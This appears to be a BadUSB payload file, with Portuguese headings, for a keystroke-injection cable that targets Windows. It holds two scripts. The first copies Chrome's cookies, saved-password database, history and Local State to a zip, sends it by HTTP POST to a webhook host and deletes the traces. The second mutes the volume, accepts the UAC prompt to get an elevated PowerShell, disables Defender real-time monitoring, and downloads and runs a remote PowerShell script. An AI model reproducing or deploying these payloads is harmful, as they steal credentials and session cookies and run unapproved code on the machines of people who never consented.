# Opção 01
```bash
## ============================================
##     PAYLOAD: Chrome Data Extraction
##     TARGET: Windows 10/11 (EN-US keyboard)
##     DEVICE: Evil Crow Cable Wind
##     AUTHOR: SAPSAN CYBERSEC
##     VERSION: 2.0 (Wind Syntax)
## ============================================
##     Wind Syntax Commands:
##     - Print <text> - types text
##     - PrintLine <text> - types text + Enter
##     - Press KEY_ENTER - press Enter key
##     - Delay <ms> - wait in milliseconds
##     - GuiR - Windows+R (Run dialog)
## ============================================
##     Extracts Chrome cookies, history, and saved
##     passwords. Sends data to attacker server.
##     CHANGE: EXFIL_URL before use!
## ============================================

Delay 1000
GuiR
Delay 500
WinPrintLine powershell -nop -ep bypass
Delay 1000

## URL de Destino
WinPrintLine $w = "https://n8n.caju.dpdns.org/webhook/bot"

## Define source and destination paths
WinPrintLine $src = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default"
WinPrintLine $dst = "$env:TEMP\chrome_data"

## Create temp directory
WinPrintLine New-Item -ItemType Directory -Force -Path $dst | Out-Null
Delay 200

## Copy Chrome data files
WinPrintLine cp "$src\Cookies" "$dst\" -fo -EA 0
WinPrintLine cp "$src\Login Data" "$dst\" -fo -EA 0
WinPrintLine cp "$src\History" "$dst\" -Force -EA 0
WinPrintLine cp "$src\..\Local State" "$dst\" -fo -EA 0
Delay 500

## Compress data
WinPrintLine Compress-Archive -Path $dst -d "$env:TEMP\data.zip" -fo
Delay 1000

## Exfiltrate via HTTP POST (change URL)
WinPrintLine Invoke-WebRequest -Uri $w -Method POST -ContentType "application/zip" -InFile "$env:TEMP\data.zip" -UseBasicParsing -EA 0
Delay 1000

## Cleanup
WinPrintLine Remove-Item -Recurse -Force $w, $dst, "$env:TEMP\data.zip" -EA 0
WinPrintLine exit
```
# Rodar Script Remoto
```bash
Delay 1000
GuiR
## Inicia Silenciado (Zera Volume Antes de Iniciar)
WinPrintLine powershell -w h -c "$s=New-Object -ComObject WScript.Shell;1..50|%{$s.SendKeys([char]174)};start powershell -v runas"
Delay 1000
Press KEY_LEFT_ALT
Press Y
Release
Delay 2000
Press KEY_LEFT_ARROW
PressRelease KEY_ENTER
Release
Delay 1000

WinPrintLine Set-MpPreference -DisableRealtimeMonitoring $true

## Definir URL do Script

WinPrintLine $u='https://raw.githubusercontent.com/b-host/bruce-sd-card/refs/heads/main/BadUSB/Payloads/ECCW/ChromeHistory/Get-ChromHistory.ps1';
WinPrintLine $d=New-Object Net.WebClient; $f='t.ps1';$d.DownloadFile($u,$f); powershell -w h -c "gc $f -Raw|iex";
```